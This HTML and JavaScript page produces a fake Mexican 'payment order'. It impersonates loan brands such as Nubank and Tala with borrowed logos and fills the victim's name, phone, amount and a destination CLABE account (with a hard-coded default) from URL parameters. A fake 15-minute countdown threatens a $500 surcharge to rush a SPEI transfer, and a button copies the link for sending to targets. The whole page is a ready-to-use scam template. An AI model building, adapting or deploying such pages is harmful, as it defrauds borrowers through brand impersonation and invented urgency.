<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Orden de Pago</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;800;900&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; background-color: #000; }
        .video-wrapper { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; overflow: hidden; }
        #bg-video { width: 100%; height: 100%; object-fit: cover; filter: brightness(0.4); }
        .card { width: 90%; max-width: 420px; background: rgba(255, 255, 255, 0.98); backdrop-filter: blur(10px); border-radius: 40px; overflow: hidden; box-shadow: 0 25px 50px rgba(0,0,0,0.6); position: relative; margin: 20px 0; }
        .logo-container { width: 70px; height: 70px; background: white; border-radius: 20px; margin: 0 auto 15px auto; display: flex; align-items: center; justify-content: center; overflow: hidden; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        .logo-container img { width: 85%; height: 85%; object-fit: contain; }
    </style>
</head>
<body>
    <div class="video-wrapper">
        <video autoplay muted loop playsinline id="bg-video">
            <source src="https://cdn.pixabay.com/video/2019/07/26/25696-351221711_large.mp4" type="video/mp4">
        </video>
    </div>

    <div class="card">
        <div id="header-color" style="padding: 30px 20px; text-align: center; color: white;">
            <div class="logo-container"><img id="img-final" src=""></div>
            <p style="font-size: 10px; font-weight: 800; letter-spacing: 1.5px; text-transform: uppercase; opacity: 0.9;">Orden de Pago</p>
            <h1 id="txt-prod" style="font-size: 24px; font-weight: 900; text-transform: uppercase;">Cargando...</h1>
        </div>

        <div style="padding: 25px;">
            <div style="margin-bottom: 20px; text-align: center; border-bottom: 1px solid #eee; padding-bottom: 15px;">
                <p id="txt-nombre" style="font-size: 16px; font-weight: 900; color: #1e293b; text-transform: uppercase;">NOMBRE CLIENTE</p>
                <p id="txt-tel" style="font-size: 18px; font-weight: 800; color: #475569; margin-top: 6px; letter-spacing: 1px;">000 000 0000</p>
            </div>

            <div style="background-color: #f8fafc; border-radius: 30px; padding: 20px 10px; text-align: center; border: 1px solid #f1f5f9; margin-bottom: 20px;">
                <p style="font-size: 9px; font-weight: 800; color: #94a3b8; text-transform: uppercase; letter-spacing: 1px;">Monto Total a Pagar</p>
                <h2 id="txt-monto" style="font-size: 42px; font-weight: 900;">$0.00</h2>
            </div>
            
            <div style="background-color: #fff1f1; border-radius: 20px; padding: 15px; margin-bottom: 20px; border: 1px solid #fee2e2;">
                <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(239, 68, 68, 0.1); padding-bottom: 8px; margin-bottom: 8px;">
                    <span style="font-size: 10px; font-weight: 800; color: #ef4444; text-transform: uppercase;">Vence el:</span>
                    <span id="txt-fecha" style="font-size: 12px; font-weight: 900; color: #ef4444;">--/--/----</span>
                </div>
                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                    <span id="timer-label" style="font-size: 10px; font-weight: 800; color: #ef4444; text-transform: uppercase;">Expira en:</span>
                    <span id="timer" style="font-size: 20px; font-weight: 900; color: #ef4444;">15:00</span>
                </div>
                <div style="background: #ef4444; color: white; padding: 8px; border-radius: 12px; text-align: center;">
                    <p style="font-size: 9px; font-weight: 800; text-transform: uppercase; line-height: 1.2;">
                        Evite un cargo adicional de $500.00 pesos realizando su pago antes de que el cronómetro llegue a cero.
                    </p>
                </div>
            </div>

            <div style="background-color: #f0f7ff; border-radius: 25px; padding: 20px; text-align: center; border: 1px solid #e0f2fe; margin-bottom: 15px;">
                <p id="txt-banco-label" style="font-size: 9px; font-weight: 800; color: #3b82f6; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 5px;">TRANSFERENCIA SPEI</p>
                <p id="txt-banco-nombre" style="font-size: 14px; font-weight: 900; color: #1e40af; text-transform: uppercase; margin-bottom: 8px;">MERCADO PAGO</p>
                <div style="background: white; border-radius: 12px; padding: 10px; border: 1px dashed #3b82f6;">
                    <span id="txt-clabe" style="font-size: 18px; font-weight: 900; color: #2563eb; letter-spacing: 0.5px;">-</span>
                </div>
            </div>

            <button onclick="copyLink()" style="width: 100%; background: #1e293b; color: white; padding: 18px; border-radius: 20px; font-weight: 800; border: none; text-transform: uppercase; letter-spacing: 1px; cursor: pointer;">Copiar Link de Pago</button>
        </div>
    </div>

    <script>
        const config = {
            'prestamos': { n: 'Préstamos', c: '#a3e635', mc: '#65a30d', l: 'https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/cb/a8/7a/cba87ab7-2fe9-aad7-e49f-a367d6c410b4/AppIcon-1x_U007ephone-0-1-0-85-220-0.jpeg/1200x630wa.png' },
            'dinero': { n: 'Préstamos de Dinero', c: '#1e40af', mc: '#1e40af', l: 'https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/31/78/92/317892a1-467e-c2c7-b7c5-be2a58b7d358/AppIcon-1x_U007ephone-0-1-0-85-220-0.png/400x400ia-75.webp' },
            'nu': { n: 'Préstamos NU', c: '#820ad1', mc: '#820ad1', l: 'https://upload.wikimedia.org/wikipedia/commons/thumb/f/f7/Nubank_logo_2021.svg/1200px-Nubank_logo_2021.svg.png' },
            'talacred': { n: 'Tala Crédito', c: '#06b6d4', mc: '#06b6d4', l: 'https://pbs.twimg.com/profile_images/1604930218606600199/95CGdKAG_400x400.png' },
            'dida': { n: 'DidaPréstamos', c: '#0057ff', mc: '#003eb3', l: 'https://is1-ssl.mzstatic.com/image/thumb/PurpleSource211/v4/e2/14/27/e21427df-1404-f93c-c8b9-230ef12d4870/Placeholder.mill/400x400bb-75.webp' },
            'rapidos': { n: 'Préstamos rápidos', c: '#10b981', mc: '#059669', l: 'https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/7f/68/39/7f683903-e675-6fbc-56fa-64d6fb206e2d/AppIcon-1x_U007ephone-0-1-0-85-220-0.jpeg/400x400ia-75.webp' },
            'worldmox': { n: 'Worldmoxpro cash', c: '#1e293b', mc: '#0f172a', l: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTOQ9FrkHlgWkaMJt_Za2IN0R5Z0UamJ_VQKg&s' },
            'movil': { n: 'Movil Cash', c: '#22c55e', mc: '#16a34a', l: 'https://play-lh.googleusercontent.com/OhU802wo_ffOcR5f6MAvz5ebNFvXOLDiC2p_b7kGS7_XBwFz3HI9jtNn6C8fBiQrzjUx' },
            'cashcredit': { n: 'Cash Credit', c: '#f59e0b', mc: '#d97706', l: 'https://play-lh.googleusercontent.com/kw_CZs5smCFpyFtI9pWkKhY1eRfX6E15tdTEU_KpxTaUYzUtRFx9b8eOJYpn-Ze4BQ=w480-h960-rw' }
        };

        const urlParams = new URLSearchParams(window.location.search);
        const prodId = urlParams.get('v') || 'prestamos';
        const item = config[prodId] || config['prestamos'];
        
        document.getElementById('header-color').style.backgroundColor = item.c;
        document.getElementById('img-final').src = item.l;
        document.getElementById('txt-prod').innerText = item.n;
        document.getElementById('txt-monto').style.color = item.mc;

        document.getElementById('txt-monto').innerText = "$" + (urlParams.get('m') || "0.00");
        document.getElementById('txt-nombre').innerText = urlParams.get('n') || "CLIENTE";
        document.getElementById('txt-tel').innerText = urlParams.get('t') || "000 000 0000";
        document.getElementById('txt-fecha').innerText = urlParams.get('f') || "--/--/----";
        
        document.getElementById('txt-banco-nombre').innerText = urlParams.get('b') || "MERCADO PAGO";
        document.getElementById('txt-clabe').innerText = urlParams.get('c') || "722969010005687921";

        const start = parseInt(urlParams.get('s')) || Date.now();
        function updateTimer() {
            const diff = (15 * 60 * 1000) - (Date.now() - start);
            if (diff <= 0) { 
                document.getElementById('timer').innerText = "00:00"; 
                document.getElementById('timer-label').innerText = "LIGA EXPIRADA";
                return; 
            }
            const m = Math.floor(diff / 60000);
            const s = Math.floor((diff % 60000) / 1000);
            document.getElementById('timer').innerText = `${m}:${s < 10 ? '0' + s : s}`;
        }
        setInterval(updateTimer, 1000);
        updateTimer();

        function copyLink() {
            navigator.clipboard.writeText(window.location.href);
            alert("Enlace de pago copiado al portapapeles");
        }
    </script>
</body>
</html>
